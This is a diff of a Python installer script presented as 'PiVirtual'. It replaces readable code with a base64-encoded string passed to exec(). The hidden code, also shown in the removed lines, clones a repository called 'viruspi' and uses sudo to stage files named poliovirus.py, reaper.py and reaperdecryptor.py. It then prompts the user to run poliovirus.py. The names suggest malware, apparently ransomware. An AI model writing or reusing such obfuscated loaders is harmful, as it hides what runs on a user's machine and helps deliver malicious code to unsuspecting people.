@@ -1,32 +1,9 @@
 #!/usr/bin/python3
 
+import base64
 
-import os
-import time
+script = ("aW1wb3J0IG9zCmltcG9ydCB0aW1lCgpwcmludCgnV2VsY29tZSB0byBQaVZpcnR1YWwhJykKaW5wdXQoJ1ByZXNzIGFueSBrZXkgdG8gYmVnaW4gdGhlIGluc3RhbGxhdGlvbiEnKQoKCgpjbWQgPSAnZ2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9UaW1vdGh5dGhlVGFwZXdvcm0vdmlydXNwaS5naXQnCm9zLnN5c3RlbShjbWQpCgp0aW1lLnNsZWVwICg1KQoKY21kMiA9ICdjZCB2aXJ1c3BpJwpvcy5zeXN0ZW0oY21kMikKCnRpbWUuc2xlZXAoMikKCmNtZDMgPSAnc3VkbyBtdiAvaG9tZS9waS9EZXNrdG9wL3ZpcnVzcGkvcG9saW92aXJ1cy5weSAvaG9tZS9waS9EZXNrdG9wL3BvbGlvdmlydXMucHknCm9zLnN5c3RlbShjbWQzKQoKY21kNCA9ICdzdWRvIG12IC9ob21lL3BpL0Rlc2t0b3AvdmlydXNwaS9yZWFwZXIucHkgL2hvbWUvcGkvRGVza3RvcC9yZWFwZXIucHknCm9zLnN5c3RlbShjbWQ0KQoKY21kNSA9ICdzdWRvIG12IC9ob21lL3BpL0Rlc2t0b3AvdmlydXNwaS9yZWFwZXJkZWNyeXB0b3IucHkgL2hvbWUvcGkvRGVza3RvcC9yZWFwZXJkZWNyeXB0b3IucHknCm9zLnN5c3RlbShjbWQ1KQoKcHJpbnQoJ0FsbW9zdCB0aGVyZSEnKQpwcmludCgnRW50ZXIgdGhlIHZpcnVzcGkgZGlyZWN0b3J5IGFuZCBydW4gdGhlIGNvbW1hbmQgcHl0aG9uMyBwb2xpb3ZpcnVzLnB5IHRvIGNvbXBsZXRlIGluc3RhbGxhdGlvbiEnKQo=")
 
-print('Welcome to PiVirtual!')
-input('Press any key to begin the installation!')
+decodedscript = base64.b64decode(script)
 
-
-
-cmd = 'git clone https://github.com/TimothytheTapeworm/viruspi.git'
-os.system(cmd)
-
-time.sleep (5)
-
-cmd2 = 'cd viruspi'
-os.system(cmd2)
-
-time.sleep(2)
-
-cmd3 = 'sudo mv /home/pi/Desktop/viruspi/poliovirus.py /home/pi/Desktop/poliovirus.py'
-os.system(cmd3)
-
-cmd4 = 'sudo mv /home/pi/Desktop/viruspi/reaper.py /home/pi/Desktop/reaper.py'
-os.system(cmd4)
-
-cmd5 = 'sudo mv /home/pi/Desktop/viruspi/reaperdecryptor.py /home/pi/Desktop/reaperdecryptor.py'
-os.system(cmd5)
-
-print('Almost there!')
-print('Enter the viruspi directory and run the command python3 poliovirus.py to complete installation!')
+exec(decodedscript)
